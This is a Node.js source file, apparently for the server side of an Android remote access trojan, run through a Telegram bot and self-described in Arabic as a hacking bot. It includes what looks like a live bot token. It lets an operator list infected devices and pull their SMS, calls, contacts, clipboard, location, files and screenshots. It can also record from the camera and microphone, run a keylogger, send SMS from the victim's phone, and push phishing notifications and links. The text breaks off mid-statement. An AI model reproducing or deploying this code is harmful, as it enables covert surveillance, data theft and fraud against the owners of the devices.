const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = "8809670275:AAGxiKsnGOj22CNyTEoQCPX4Q-j3XOLwo4U"
const id = "1002670694"
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer({ dest: 'uploadedFile/' });
const fs = require('fs');

app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.get('/getFile/*', function (req, res) {
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if(err == null) {
      res.sendFile(filePath)
    } else if (err.code === 'ENONET') {
      res.send(`<h1>File not exist</h1>`)
    } else {
      res.send(`<h1>Error, not found</h1>`)
    }
  });
})

app.get('/deleteFile/*', function (req, res) {
  const fileName = req.params[0]
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if (err == null) {
      fs.unlink(filePath, (err) => {
        if (err) {
          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
        } else {
          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
        }
      });
    } else if (err.code === 'ENOENT') {
      // file does not exist
      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
    } else {
      res.send('<h1>Some other error: </h1>', err.code)
    }
  });
})



app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    const file_name = req.file.filename
    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
    const host_url = req.protocol + '://' + req.get('host')
    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
      if ( err ) console.log('ERROR: ' + err);
    });
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
/*
   {
     parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
           [{text: '𝗗𝗲𝗹𝗲𝘁𝗲 𝗙𝗶𝗹𝗲', callback_data: `delete_file:${name}`}]
         ]}
   }, 
   */
{parse_mode: "HTML", disable_web_page_preview: true})
   res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body['text'],
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML", disable_web_page_preview: true})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز`,
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }

        if (message.reply_to_message.text.includes('°•أدخل الرابط الذي تريد إرساله')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`open_target_link:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل النص المراد نطقه')) {
            const message_to_tts = message.text
            const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' + encodeURIComponent(message_to_tts)
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`text_to_speech:${message_tts_link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }



        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                 '°• مرحبا بكم في بوت الاختراق مطور البوتايهاب الحوباني  𝗘𝗛𝗔𝗕

' +
                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال

' +
                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر

' +
                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر

' +
                '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                   '°• لا توجد اجهزة متصلة ومتوفرة

' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                   '°• لا توجد اجهزة متصلة ومتوفرة

' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الثناء للجهاز  : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'التطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'الحصول علئ الملفات', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: 'المكرفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                        {text: 'الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`},
                        {text: 'نخب', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'يهتز', callback_data: `vibrate:${uuid}`},
                        {text: 'اظهار الاخطار', callback_data: `show_notification:${uuid}`}
                    ],
                   [
                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
                        {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                        {text: 'ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {text: '🔥', callback_data: `my_fire_emoji:${uuid}`},
                        {text: 'لقطة شاشة', callback_data: `screenshot:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل المصباح', callback_data: `torch_on:${uuid}`},
                        {text: 'إيقاف المصباح', callback_data: `torch_off:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل مسجل المفاتيح', callback_data: `keylogger_on:${uuid}`},
                        {text: 'إيقاف تشغيل تسجيل', callback_data: `keylogger_off:${uuid}`},
                    ],
                    [
                        {text: 'فتح رابط الهدف', callback_data: `open_target_link:${uuid}`},
                        {text: 'تحويل النص إلى كلام', callback_data: `text_to_speech:${uuid}`},
                    ],
                    [
                        {
                            text: 'إرسال رسالة إلى جميع جهات الاتصال الـ',
                            callback_data: `send_message_to_all:${uuid}`
                        },
                    ],
                    [
                        {
                            text: 'أزرار الجهاز',
                            callback_data: `device_button:${uuid}`
                        },
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية

' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع

' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    if (commend == 'open_target_link') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•أدخل الرابط الذي تريد إرساله\n\n' +
            '• احذر من إرسال الروابط وحدها 2 بدون أي نص',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'text_to_speech') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل النص المراد نطقه\n\n' +
            '•  لاحظ أنه يجب عليك إدخال النص الذي يجب نطقه على الجهاز. أي لغة مقبولة..',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'my_fire_emoji') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
